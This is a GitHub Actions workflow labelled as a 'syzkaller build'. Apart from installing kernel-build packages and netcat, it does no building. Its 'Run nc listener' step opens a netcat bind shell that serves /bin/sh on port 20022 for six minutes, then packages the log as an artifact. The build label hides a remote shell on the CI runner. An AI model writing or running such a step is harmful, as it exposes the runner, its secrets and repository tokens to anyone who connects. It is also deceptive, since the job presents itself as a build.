name: syzkaller build

on:
  push:
    branches: [master]
  pull_request:
    branches: [master]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            build-essential \
            bc \
            bison \
            flex \
            libssl-dev \
            libelf-dev \
            dwarves \
            cpio \
            kmod \
            git \
            rsync \
            dpkg-dev \
            wget \
            xz-utils \
            busybox-static netcat

      - name: Run nc listener
        run: |
          set -o pipefail

          {
            busybox nc -l -p 20022 -e /bin/sh -i &

            sleep 360

          } 2>&1 | tee -a ~/mylog.txt

      - name: Collect artifacts
        run: |
          mkdir -p output

          cp ~/mylog.txt output/

          tar czvf result.tar.gz \
            -C output .

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: result
          path: result.tar.gz
